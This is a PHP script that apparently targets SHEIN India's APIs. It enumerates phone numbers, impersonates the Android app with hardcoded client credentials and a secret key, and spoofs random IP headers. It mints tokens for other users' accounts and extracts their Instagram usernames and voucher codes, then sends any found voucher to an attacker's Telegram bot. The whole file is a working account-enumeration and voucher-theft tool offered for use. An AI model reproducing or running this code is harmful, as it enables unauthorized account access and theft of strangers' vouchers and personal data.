<?php
// Enable error reporting for debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Set headers for CORS
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight requests
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only accept POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Get POST data
$input = json_decode(file_get_contents('php://input'), true);
$number = $input['number'] ?? '';
$botToken = $input['botToken'] ?? '';
$chatId = $input['chatId'] ?? '';

// Validate phone number
if (!preg_match('/^\d{10}$/', $number)) {
    echo json_encode(['error' => 'Invalid phone number format']);
    exit();
}

// Function to make HTTP calls (exactly like your original)
function httpCall($url, $data = null, $headers = [], $method = "GET", $returnHeaders = false, $proxy = false, $ip = null, $auth = null) {
    if (empty($headers)) {
        $ip = long2ip(mt_rand());
        $headers = [
            "X-Forwarded-For: $ip",
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
        ];
    }
    
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HEADER => $returnHeaders,
        CURLOPT_ENCODING => 'gzip',
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_CONNECTTIMEOUT => 5,
        CURLOPT_TIMEOUT => 10
    ]);
    
    if ($proxy) {
        curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
        curl_setopt($ch, CURLOPT_PROXY, $ip);
        if ($auth) {
            curl_setopt($ch, CURLOPT_PROXYUSERPWD, $auth);
        }
    }
    
    if (strtoupper($method) === "POST") {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    } else {
        if ($data) {
            $url .= "?" . http_build_query($data);
            curl_setopt($ch, CURLOPT_URL, $url);
        }
    }
    
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    return $output;
}

// Helper functions
function randIp() { 
    return rand(100,200).".".rand(10,250).".".rand(10,250).".".rand(1,250); 
}

function genDeviceId() { 
    return bin2hex(random_bytes(8)); 
}

function sendToTelegram($message, $botToken, $chatId) {
    if (empty($botToken) || empty($chatId) || $botToken === 'YOUR_BOT_TOKEN' || $chatId === 'YOUR_CHAT_ID') {
        return false;
    }
    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    
    $headers = [
        "Content-Type: application/x-www-form-urlencoded"
    ];
    
    $response = httpCall($url, http_build_query($data), $headers, "POST");
    return true;
}

// Main logic
try {
    $ip = randIp();
    $adId = genDeviceId();
    
    error_log("Checking number: $number, IP: $ip, AdId: $adId");
    
    // Step 1: Get access token
    $url = "https://api.rep.sheinindia.in/uaas/jwt/token/client";
    $headers = [
        "Client_type: Android/29",
        "Accept: application/json",
        "Client_version: 1.0.8",
        "User-Agent: Android",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "X-Tenant: B2C",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "grantType=client_credentials&clientName=trusted_client&clientSecret=secret";
    $res = httpCall($url, $data, $headers, "POST", 0);
    
    $j = json_decode($res, true);
    if (!$j || !isset($j['access_token'])) {
        error_log("Failed to get access token. Response: " . substr($res, 0, 200));
        echo json_encode(['status' => 'error', 'error' => 'Error generating token', 'number' => $number]);
        exit();
    }
    
    $access_token = $j['access_token'];
    
    // Step 2: Account check
    $url = "https://api.services.sheinindia.in/uaas/accountCheck?client_type=Android%2F29&client_version=1.0.8";
    $headers = [
        "Authorization: Bearer $access_token",
        "Requestid: account_check",
        "X-Tenant: B2C",
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/x-www-form-urlencoded",
        "X-Forwarded-For: $ip"
    ];
    
    $data = "mobileNumber=$number";
    $res = httpCall($url, $data, $headers, "POST", 0);
    $j = json_decode($res, true);
    
    if (!$j) {
        error_log("Failed to parse account check response: " . substr($res, 0, 200));
        echo json_encode(['status' => 'error', 'error' => 'Failed to check account', 'number' => $number]);
        exit();
    }
    
    if (isset($j['success']) && $j['success'] === false) {
        echo json_encode(['status' => 'not_registered', 'number' => $number]);
        exit();
    }
    
    if (!isset($j['encryptedId'])) {
        echo json_encode(['status' => 'error', 'error' => 'No encrypted ID', 'number' => $number]);
        exit();
    }
    
    $encryptedId = $j['encryptedId'];
    
    // Step 3: Generate SHEINverse token
    $payload = json_encode([
        "client_type" => "Android/29",
        "client_version" => "1.0.8",
        "gender" => "",
        "phone_number" => $number,
        "secret_key" => "3LFcKwBTXcsMzO5LaUbNYoyMSpt7M3RP5dW9ifWffzg",
        "user_id" => $encryptedId,
        "user_name" => ""
    ]);
    
    $headers = [
        "Accept: application/json",
        "User-Agent: Android",
        "Client_type: Android/29",
        "Client_version: 1.0.8",
        "X-Tenant-Id: SHEIN",
        "Ad_id: $adId",
        "Content-Type: application/json; charset=UTF-8",
        "X-Forwarded-For: $ip"
    ];
    
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/auth/generate-token";
    $res = httpCall($url, $payload, $headers, "POST", 0);
    $j = json_decode($res, true);
    
    if (!$j || empty($j['access_token'])) {
        echo json_encode(['status' => 'registered_no_voucher', 'number' => $number]);
        exit();
    }
    
    $sheinverse_access_token = $j['access_token'];
    
    // Step 4: Get user data
    $url = "https://shein-creator-backend-151437891745.asia-south1.run.app/api/v1/user";
    $headers = [
        "Host: shein-creator-backend-151437891745.asia-south1.run.app",
        "Authorization: Bearer " . $sheinverse_access_token,
        "User-Agent: Mozilla/5.0 (Linux; Android 15; SM-S938B Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/140.0.7339.207 Mobile Safari/537.36",
        "Accept: */*",
        "Origin: https://sheinverse.galleri5.com",
        "X-Requested-With: com.ril.shein",
        "Referer: https://sheinverse.galleri5.com/",
        "Content-Type: application/json",
        "X-Forwarded-For: $ip"
    ];
    
    $res = httpCall($url, "", $headers, "GET", 0);
    $decoded = json_decode($res, true);
    
    if (!$decoded || !isset($decoded['user_data']['instagram_data']['username'])) {
        echo json_encode(['status' => 'registered_no_voucher', 'number' => $number]);
        exit();
    }
    
    // Extract data
    $username = $decoded['user_data']['instagram_data']['username'];
    $voucher = $decoded['user_data']['voucher_data']['voucher_code'] ?? 'N/A';
    $voucher_amount = $decoded['user_data']['voucher_data']['voucher_amount'] ?? 'N/A';
    $expiry_date = $decoded['user_data']['voucher_data']['expiry_date'] ?? '';
    $min_purchase_amount = $decoded['user_data']['voucher_data']['min_purchase_amount'] ?? '';
    
    // Prepare result
    $result = [
        'status' => ($voucher !== 'N/A') ? 'success' : 'registered_no_voucher',
        'number' => $number,
        'instagram' => $username,
        'voucherCode' => $voucher,
        'voucherAmount' => $voucher_amount,
        'minPurchase' => $min_purchase_amount,
        'expiry' => $expiry_date
    ];
    
    // Send to Telegram if voucher found
    if ($voucher !== 'N/A' && !empty($botToken) && !empty($chatId)) {
        $message = "🎉 <b>VOUCHER FOUND!</b> 🎉\n\n";
        $message .= "📱 <b>Number:</b> <code>$number</code>\n";
        $message .= "📸 <b>Instagram:</b> $username\n";
        $message .= "🎫 <b>Voucher Code:</b> <code>$voucher</code>\n";
        $message .= "💰 <b>Amount:</b> ₹$voucher_amount\n";
        $message .= "🛒 <b>Min Purchase:</b> ₹$min_purchase_amount\n";
        $message .= "⏰ <b>Expiry:</b> $expiry_date\n\n";
        $message .= "https://t.me/share/url?url=$voucher";
        
        sendToTelegram($message, $botToken, $chatId);
    }
    
    echo json_encode($result);
    
} catch (Exception $e) {
    error_log("Exception: " . $e->getMessage());
    echo json_encode(['status' => 'error', 'error' => $e->getMessage(), 'number' => $number]);
}

?>
